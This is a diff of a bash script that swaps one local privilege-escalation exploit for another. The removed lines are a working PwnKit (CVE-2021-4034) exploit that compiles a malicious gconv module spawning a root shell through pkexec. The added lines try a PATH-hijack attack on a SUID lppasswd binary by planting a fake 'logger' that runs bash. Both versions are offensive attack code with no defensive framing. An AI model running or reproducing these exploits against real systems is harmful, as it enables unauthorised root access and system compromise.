@@ -1,47 +1,22 @@
 #!/bin/bash
 
-echo "[+] CVE-2021-4034 (PwnKit) Custom Exploit"
-echo "[+] Creating malicious C file..."
+echo "[+] Checking for vulnerable SUID binary: /usr/bin/lppasswd"
+if [[ ! -u /usr/bin/lppasswd ]]; then
+    echo "[-] /usr/bin/lppasswd is not SUID or doesn't exist"
+    exit 1
+fi
 
-cat <<EOF > pwnkit.c
-#include <unistd.h>
-#include <stdio.h>
-#include <stdlib.h>
+echo "[+] Creating fake binary to hijack PATH..."
 
-void gconv() {}
-void gconv_init() {
-    setuid(0); setgid(0);
-    seteuid(0); setegid(0);
-    system("/bin/sh");
-}
-EOF
+# Step 1: Create a fake binary that spawns a shell
+mkdir -p /tmp/fakebin
+echo -e '#!/bin/bash\n/bin/bash' > /tmp/fakebin/logger
+chmod +x /tmp/fakebin/logger
 
-echo "[+] Compiling payload..."
-mkdir -p 'GCONV_PATH=.'
-echo > 'GCONV_PATH=./gconv-modules'
-mkdir -p exploit
-mv pwnkit.c exploit/pwnkit.c
+# Step 2: Prepend /tmp/fakebin to PATH and run lppasswd
+echo "[+] Hijacking PATH and running lppasswd..."
+PATH=/tmp/fakebin:$PATH /usr/bin/lppasswd
 
-cat <<EOF > exploit/gconv-modules
-module UTF-8// PWNKIT// pwnkit 2
-EOF
+# Step 3: Cleanup (optional)
+# rm -rf /tmp/fakebin
 
-(cd exploit && gcc pwnkit.c -o pwnkit.so -shared -fPIC)
-
-echo "[+] Creating directory structure..."
-mkdir -p exploit/GCONV_PATH=.
-cd exploit
-
-cat <<EOF > pwnkit
-#!/bin/sh
-export PATH=.
-export GCONV_PATH=.
-export CHARSET=PWNKIT
-export SHELL=not-used
-pkexec
-EOF
-
-chmod +x pwnkit
-
-echo "[+] Running exploit..."
-./pwnkit
